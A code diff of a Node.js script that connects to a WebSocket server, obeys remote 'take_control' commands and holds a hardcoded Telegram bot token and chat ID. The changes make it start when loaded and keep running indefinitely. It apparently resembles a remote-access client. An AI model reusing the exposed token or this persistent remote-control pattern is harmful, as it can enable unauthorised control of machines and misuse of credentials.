@@ -5,10 +5,8 @@ const fs = require('fs');
 const os = require('os');
 const path = require('path');
 const https = require('https');
- 
+
 // --- CONFIGURATION ---
-// Ensure this URL matches your actual Vercel WebSocket endpoint
-// If your Vercel server is at /api/ws, use: 'wss://server-eight-pi-39.vercel.app/api/ws'
 const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
 const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
 const TELEGRAM_CHAT_ID = '6172226452';
@@ -52,7 +50,6 @@ function initConnection() {
             if (data.type === 'take_control') takeControl(true);
             else if (data.type === 'release_control') takeControl(false);
             else if (data.type === 'offer' || data.type === 'answer' || data.type === 'candidate') {
-                // Handle signaling messages here if needed
                 handleSignaling(data);
             }
         } catch (e) {
@@ -79,6 +76,8 @@ function reconnect() {
         setTimeout(initConnection, delay);
     } else {
         console.log("Max reconnection attempts reached.");
+        // Keep the process alive anyway
+        keepAlive();
     }
 }
 
@@ -168,11 +167,16 @@ function handleSignaling(data) {
     console.log("Received signaling data:", data);
 }
 
+function keepAlive() {
+    // Prevent the process from exiting by keeping an interval alive
+    setInterval(() => {}, 60000);
+}
+
+// Start the connection
+initConnection();
+
 // Export the handler for Vercel compatibility
 exports.handler = async (event, context) => {
-    // Start the connection in the background
-    initConnection();
-
     // Return immediately to avoid timeout
     return {
         statusCode: 200,
